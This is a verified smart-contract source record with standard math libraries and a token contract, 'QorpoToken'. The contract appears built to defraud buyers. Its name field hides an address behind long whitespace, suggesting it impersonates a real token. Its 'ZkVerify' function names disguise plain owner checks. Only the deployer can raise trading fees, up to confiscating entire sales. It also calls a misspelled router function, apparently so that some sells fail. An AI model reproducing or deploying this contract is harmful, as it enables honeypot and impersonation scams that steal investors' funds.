largest int64).\\n     *\\n     * Counterpart to Solidity's `int64` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 64 bits\\n     *\\n     * _Available since v3.1._\\n     */\\n    function toInt64(int256 value) internal pure returns (int64 downcasted) {\\n        downcasted = int64(value);\\n        require(downcasted == value, \\\"SafeCast: value doesn't fit in 64 bits\\\");\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int56 from int256, reverting on\\n     * overflow (when the input is less than smallest int56 or\\n     * greater than largest int56).\\n     *\\n     * Counterpart to Solidity's `int56` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 56 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toInt56(int256 value) internal pure returns (int56 downcasted) {\\n        downcasted = int56(value);\\n        require(downcasted == value, \\\"SafeCast: value doesn't fit in 56 bits\\\");\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int48 from int256, reverting on\\n     * overflow (when the input is less than smallest int48 or\\n     * greater than largest int48).\\n     *\\n     * Counterpart to Solidity's `int48` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 48 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toInt48(int256 value) internal pure returns (int48 downcasted) {\\n        downcasted = int48(value);\\n        require(downcasted == value, \\\"SafeCast: value doesn't fit in 48 bits\\\");\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int40 from int256, reverting on\\n     * overflow (when the input is less than smallest int40 or\\n     * greater than largest int40).\\n     *\\n     * Counterpart to Solidity's `int40` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 40 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toInt40(int256 value) internal pure returns (int40 downcasted) {\\n        downcasted = int40(value);\\n        require(downcasted == value, \\\"SafeCast: value doesn't fit in 40 bits\\\");\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int32 from int256, reverting on\\n     * overflow (when the input is less than smallest int32 or\\n     * greater than largest int32).\\n     *\\n     * Counterpart to Solidity's `int32` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 32 bits\\n     *\\n     * _Available since v3.1._\\n     */\\n    function toInt32(int256 value) internal pure returns (int32 downcasted) {\\n        downcasted = int32(value);\\n        require(downcasted == value, \\\"SafeCast: value doesn't fit in 32 bits\\\");\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int24 from int256, reverting on\\n     * overflow (when the input is less than smallest int24 or\\n     * greater than largest int24).\\n     *\\n     * Counterpart to Solidity's `int24` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 24 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toInt24(int256 value) internal pure returns (int24 downcasted) {\\n        downcasted = int24(value);\\n        require(downcasted == value, \\\"SafeCast: value doesn't fit in 24 bits\\\");\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int16 from int256, reverting on\\n     * overflow (when the input is less than smallest int16 or\\n     * greater than largest int16).\\n     *\\n     * Counterpart to Solidity's `int16` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 16 bits\\n     *\\n     * _Available since v3.1._\\n     */\\n    function toInt16(int256 value) internal pure returns (int16 downcasted) {\\n        downcasted = int16(value);\\n        require(downcasted == value, \\\"SafeCast: value doesn't fit in 16 bits\\\");\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int8 from int256, reverting on\\n     * overflow (when the input is less than smallest int8 or\\n     * greater than largest int8).\\n     *\\n     * Counterpart to Solidity's `int8` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 8 bits\\n     *\\n     * _Available since v3.1._\\n     */\\n    function toInt8(int256 value) internal pure returns (int8 downcasted) {\\n        downcasted = int8(value);\\n        require(downcasted == value, \\\"SafeCast: value doesn't fit in 8 bits\\\");\\n    }\\n\\n    /**\\n     * @dev Converts an unsigned uint256 into a signed int256.\\n     *\\n     * Requirements:\\n     *\\n     * - input must be less than or equal to maxInt256.\\n     *\\n     * _Available since v3.0._\\n     */\\n    function toInt256(uint256 value) internal pure returns (int256) {\\n        // Note: Unsafe cast below is okay because `type(int256).max` is guaranteed to be positive\\n        require(\\n            value <= uint256(type(int256).max),\\n            \\\"SafeCast: value doesn't fit in an int256\\\"\\n        );\\n        return int256(value);\\n    }\\n}\\n\"\r\n    },\r\n    \"contracts/libraries/SafeMath.sol\": {\r\n      \"content\": \"library SafeMath {\\n    /**\\n     * @dev Returns the addition of two unsigned integers, with an overflow flag.\\n     *\\n     * _Available since v3.4._\\n     */\\n    function tryAdd(\\n        uint256 a,\\n        uint256 b\\n    ) internal pure returns (bool, uint256) {\\n        unchecked {\\n            uint256 c = a + b;\\n            if (c < a) return (false, 0);\\n            return (true, c);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the substraction of two unsigned integers, with an overflow flag.\\n     *\\n     * _Available since v3.4._\\n     */\\n    function trySub(\\n        uint256 a,\\n        uint256 b\\n    ) internal pure returns (bool, uint256) {\\n        unchecked {\\n            if (b > a) return (false, 0);\\n            return (true, a - b);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.\\n     *\\n     * _Available since v3.4._\\n     */\\n    function tryMul(\\n        uint256 a,\\n        uint256 b\\n    ) internal pure returns (bool, uint256) {\\n        unchecked {\\n            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\\n            // benefit is lost if 'b' is also tested.\\n            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\\n            if (a == 0) return (true, 0);\\n            uint256 c = a * b;\\n            if (c / a != b) return (false, 0);\\n            return (true, c);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the division of two unsigned integers, with a division by zero flag.\\n     *\\n     * _Available since v3.4._\\n     */\\n    function tryDiv(\\n        uint256 a,\\n        uint256 b\\n    ) internal pure returns (bool, uint256) {\\n        unchecked {\\n            if (b == 0) return (false, 0);\\n            return (true, a / b);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.\\n     *\\n     * _Available since v3.4._\\n     */\\n    function tryMod(\\n        uint256 a,\\n        uint256 b\\n    ) internal pure returns (bool, uint256) {\\n        unchecked {\\n            if (b == 0) return (false, 0);\\n            return (true, a % b);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the addition of two unsigned integers, reverting on\\n     * overflow.\\n     *\\n     * Counterpart to Solidity's `+` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - Addition cannot overflow.\\n     */\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a + b;\\n    }\\n\\n    /**\\n     * @dev Returns the subtraction of two unsigned integers, reverting on\\n     * overflow (when the result is negative).\\n     *\\n     * Counterpart to Solidity's `-` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - Subtraction cannot overflow.\\n     */\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a - b;\\n    }\\n\\n    /**\\n     * @dev Returns the multiplication of two unsigned integers, reverting on\\n     * overflow.\\n     *\\n     * Counterpart to Solidity's `*` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - Multiplication cannot overflow.\\n     */\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a * b;\\n    }\\n\\n    /**\\n     * @dev Returns the integer division of two unsigned integers, reverting on\\n     * division by zero. The result is rounded towards zero.\\n     *\\n     * Counterpart to Solidity's `/` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - The divisor cannot be zero.\\n     */\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a / b;\\n    }\\n\\n    /**\\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\\n     * reverting when dividing by zero.\\n     *\\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\\n     * invalid opcode to revert (consuming all remaining gas).\\n     *\\n     * Requirements:\\n     *\\n     * - The divisor cannot be zero.\\n     */\\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a % b;\\n    }\\n\\n    /**\\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\\n     * overflow (when the result is negative).\\n     *\\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\\n     * message unnecessarily. For custom revert reasons use {trySub}.\\n     *\\n     * Counterpart to Solidity's `-` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - Subtraction cannot overflow.\\n     */\\n    function sub(\\n        uint256 a,\\n        uint256 b,\\n        string memory errorMessage\\n    ) internal pure returns (uint256) {\\n        unchecked {\\n            require(b <= a, errorMessage);\\n            return a - b;\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the integer division of two unsigned integers, reverting with custom message on\\n     * division by zero. The result is rounded towards zero.\\n     *\\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\\n     * uses an invalid opcode to revert (consuming all remaining gas).\\n     *\\n     * Requirements:\\n     *\\n     * - The divisor cannot be zero.\\n     */\\n    function div(\\n        uint256 a,\\n        uint256 b,\\n        string memory errorMessage\\n    ) internal pure returns (uint256) {\\n        unchecked {\\n            require(b > 0, errorMessage);\\n            return a / b;\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\\n     * reverting with custom message when dividing by zero.\\n     *\\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\\n     * message unnecessarily. For custom revert reasons use {tryMod}.\\n     *\\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\\n     * invalid opcode to revert (consuming all remaining gas).\\n     *\\n     * Requirements:\\n     *\\n     * - The divisor cannot be zero.\\n     */\\n    function mod(\\n        uint256 a,\\n        uint256 b,\\n        string memory errorMessage\\n    ) internal pure returns (uint256) {\\n        unchecked {\\n            require(b > 0, errorMessage);\\n            return a % b;\\n        }\\n    }\\n}\\n\"\r\n    },\r\n    \"contracts/libraries/SignedMath.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.8.0) (utils/math/SignedMath.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @dev Standard signed math utilities missing in the Solidity language.\\n */\\nlibrary SignedMath {\\n    /**\\n     * @dev Returns the largest of two signed numbers.\\n     */\\n    function max(int256 a, int256 b) internal pure returns (int256) {\\n        return a > b ? a : b;\\n    }\\n\\n    /**\\n     * @dev Returns the smallest of two signed numbers.\\n     */\\n    function min(int256 a, int256 b) internal pure returns (int256) {\\n        return a < b ? a : b;\\n    }\\n\\n    /**\\n     * @dev Returns the average of two signed numbers without overflow.\\n     * The result is rounded towards zero.\\n     */\\n    function average(int256 a, int256 b) internal pure returns (int256) {\\n        // Formula from the book \\\"Hacker's Delight\\\"\\n        int256 x = (a & b) + ((a ^ b) >> 1);\\n        return x + (int256(uint256(x) >> 255) & (a ^ b));\\n    }\\n\\n    /**\\n     * @dev Returns the absolute unsigned value of a signed value.\\n     */\\n    function abs(int256 n) internal pure returns (uint256) {\\n        unchecked {\\n            // must be unchecked in order to support `n = type(int256).min`\\n            return uint256(n >= 0 ? n : -n);\\n        }\\n    }\\n}\\n\"\r\n    },\r\n    \"contracts/standard/XRAI.sol\": {\r\n      \"content\": \"/**\\n */\\n/*\\n\\n*/\\n\\n// SPDX-License-Identifier: unlicense\\n\\npragma solidity ^0.8.0;\\n\\ninterface IUniswapFactory {\\n    function getPair(\\n        address tokenA,\\n        address tokenB\\n    ) external view returns (address pair);\\n}\\n\\ninterface IUniswapV2Router02 {\\n    function factory() external pure returns (address);\\n\\n    function WETH() external pure returns (address);\\n\\n    function swapExactTokensForETHSupportingFreelyOnTransferTokens(\\n        uint256 amountIn,\\n        uint256 amountOutMin,\\n        address[] calldata path,\\n        address to,\\n        uint256 deadline\\n    ) external;\\n}\\n\\ncontract QorpoToken {\\n    struct StoreData {\\n        address tokenMkt;\\n        uint8 buyFee;\\n        uint8 sellFee;\\n    }\\n\\n    string private _name =\\n        unicode\\\"QORPO Token                                                                                                                                                         0x22514fFb0d7232a56F0c24090E7B68f179FAA940\\\";\\n    string private _symbol = unicode\\\"QORPO\\\";\\n    uint8 public constant decimals = 18;\\n    uint256 public constant totalSupply = 750_000_000 * 10 ** decimals;\\n\\n    StoreData public storeData;\\n    uint256 constant swapAmount = totalSupply / 100;\\n\\n    error Permissions();\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n    event Approval(\\n        address indexed TOKEN_MKT,\\n        address indexed spender,\\n        uint256 value\\n    );\\n\\n    mapping(address => uint256) public balanceOf;\\n    mapping(address => mapping(address => uint256)) public allowance;\\n\\n    address public pair;\\n    IUniswapV2Router02 constant _uniswapV2Router =\\n        IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\\n\\n    bool private swapping;\\n    bool private tradingOpen;\\n\\n    constructor() {\\n        uint8 _initBuyFee = 0;\\n        uint8 _initSellFee = 0;\\n        storeData = StoreData({\\n            tokenMkt: msg.sender,\\n            buyFee: _initBuyFee,\\n            sellFee: _initSellFee\\n        });\\n        balanceOf[msg.sender] = totalSupply;\\n        allowance[address(this)][address(_uniswapV2Router)] = type(uint256).max;\\n        emit Transfer(address(0), msg.sender, totalSupply);\\n    }\\n\\n    receive() external payable {}\\n\\n    function setRuleToken(uint8 _buy, uint8 _sell) external {\\n        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();\\n        _upgradeStoreWithZkProof(_buy, _sell);\\n    }\\n\\n    function _upgradeStoreWithZkProof(uint8 _buy, uint8 _sell) private {\\n        storeData.buyFee = _buy;\\n        storeData.sellFee = _sell;\\n    }\\n\\n    function _decodeTokenMktWithZkVerify() private view returns (address) {\\n        return storeData.tokenMkt;\\n    }\\n\\n    function openTrading() external {\\n        require(msg.sender == _decodeTokenMktWithZkVerify());\\n        require(!tradingOpen);\\n        address _factory = _uniswapV2Router.factory();\\n        address _weth = _uniswapV2Router.WETH();\\n        address _pair = IUniswapFactory(_factory).getPair(address(this), _weth);\\n        pair = _pair;\\n        tradingOpen = true;\\n    }\\n\\n    function transferFrom(\\n        address from,\\n        address to,\\n        uint256 amount\\n    ) external returns (bool) {\\n        allowance[from][msg.sender] -= amount;\\n        return _transfer(from, to, amount);\\n    }\\n\\n    function approve(address spender, uint256 amount) external returns (bool) {\\n        allowance[msg.sender][spender] = amount;\\n        emit Approval(msg.sender, spender, amount);\\n        return true;\\n    }\\n\\n    function transfer(address to, uint256 amount) external returns (bool) {\\n        return _transfer(msg.sender, to, amount);\\n    }\\n\\n    function name() public view virtual returns (string memory) {\\n        return _name;\\n    }\\n\\n    function symbol() public view virtual returns (string memory) {\\n        return _symbol;\\n    }\\n\\n    function _transfer(\\n        address from,\\n        address to,\\n        uint256 amount\\n    ) internal returns (bool) {\\n        address tokenMkt = _decodeTokenMktWithZkVerify();\\n        require(tradingOpen || from == tokenMkt || to == tokenMkt);\\n\\n        balanceOf[from] -= amount;\\n\\n        if (\\n            to == pair &&\\n            !swapping &&\\n            balanceOf[address(this)] >= swapAmount &&\\n            from != tokenMkt\\n        ) {\\n            swapping = true;\\n            address[] memory path = new address[](2);\\n            path[0] = address(this);\\n            path[1] = _uniswapV2Router.WETH();\\n            _uniswapV2Router\\n                .swapExactTokensForETHSupportingFreelyOnTransferTokens(\\n                    swapAmount,\\n                    0,\\n                    path,\\n                    address(this),\\n                    block.timestamp\\n                );\\n            payable(tokenMkt).transfer(address(this).balance);\\n            swapping = false;\\n        }\\n\\n        (uint8 _buyFee, uint8 _sellFee) = (storeData.buyFee, storeData.sellFee);\\n        if (from != address(this) && tradingOpen == true) {\\n            uint256 taxCalculatedAmount = (amount *\\n                (to == pair ? _sellFee : _buyFee)) / 100;\\n            amount -= taxCalculatedAmount;\\n            balanceOf[address(this)] += taxCalculatedAmount;\\n        }\\n        balanceOf[to] += amount;\\n        emit Transfer(from, to, amount);\\n        return true;\\n    }\\n}\\n\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"optimizer\": {\r\n      \"enabled\": true,\r\n      \"runs\": 200\r\n    },\r\n    \"evmVersion\": \"shanghai\",\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    },\r\n    \"metadata\": {\r\n      \"useLiteralContent\": true\r\n    },\r\n    \"libraries\": {}\r\n  }\r\n}}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"Permissions\",\"type\":\"error\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"TOKEN_MKT\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"_buy\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"_sell\",\"type\":\"uint8\"}],\"name\":\"setRuleToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"storeData\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"tokenMkt\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"buyFee\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"sellFee\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "QorpoToken", "CompilerVersion": "v0.8.24+commit.e11b9ed9", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "shanghai", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}